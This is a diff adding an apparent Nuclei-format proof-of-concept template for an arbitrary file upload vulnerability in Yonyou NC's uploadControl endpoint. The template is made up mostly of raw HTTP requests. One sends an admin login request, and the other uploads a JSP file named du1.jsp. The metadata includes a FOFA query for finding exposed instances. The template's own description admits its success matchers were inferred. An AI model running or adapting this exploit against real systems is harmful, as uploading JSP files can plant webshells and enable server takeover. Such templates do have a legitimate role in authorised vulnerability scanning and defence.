@@ -1,0 +1,85 @@
+id: poc-5fa05a4d79d2fe028046
+info:
+  name: 用友NCuploadControl任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5fa05a4d79d2fe028046645d8865ba71
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 5fa05a4d79d2fe028046645d8865ba71
+    fofa: + huiter：`app.name=="用友 UAP"`
+http:
+- raw:
+  - 'GET /mp/loginxietong?username=admin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /mp/uploadControl/uploadFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 312
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Origin: null
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Cookie: JSESSIONID=633538797AC8C855098ACCFEAC78A197.server;
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+
+    Content-Disposition: form-data; name="file"; filename="du1.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    Hello Administrator!
+
+    ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+
+    Content-Disposition: form-data; name="submit"
+
+
+    上传
+
+    ------WebKitFormBoundaryoDIsCqVMmF83ptmp--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
